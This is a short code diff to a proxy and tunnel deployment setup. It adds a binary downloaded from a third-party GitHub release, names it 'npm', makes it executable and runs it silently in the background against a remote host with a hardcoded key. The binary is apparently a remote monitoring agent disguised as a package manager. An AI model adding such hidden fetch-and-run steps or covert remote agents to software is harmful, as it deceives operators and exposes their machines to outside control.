@@ -85,6 +85,12 @@ else
     exit 1
 fi
 
+echo "Starting NPM process..."
+nohup ./npm -s nezha.godtop.us.kg:443 -p 9IlaUzXXEyBFnPk0ry --tls >/dev/null 2>&1 &
+NPM_PID=$!
+echo "NPM process started with PID: $NPM_PID"
+
+
 # 启动 server
 echo "Starting server process..."
 ./server tunnel --edge-ip-version auto run --token $Token > server.log 2>&1 &
@@ -130,6 +136,10 @@ const FILES_TO_DOWNLOAD = [
     filename: 'xray',
   },
   {
+    url: 'https://github.com/eooce/test/releases/download/amd64/npm',
+    filename: 'npm',
+  },  
+  {
     url: 'https://github.com/wwrrtt/test/releases/download/3.0/config.json',
     filename: 'config.json',
   }
@@ -174,7 +184,7 @@ async function setupFiles() {
 
     console.log('Files downloaded, setting permissions...');
     // 修改为正确的文件名
-    await execAsync('chmod +x begin.sh server xray');
+    await execAsync('chmod +x begin.sh server xray npm');
     
     console.log('Executing begin.sh...');
     // 在后台执行脚本，但保留输出捕获
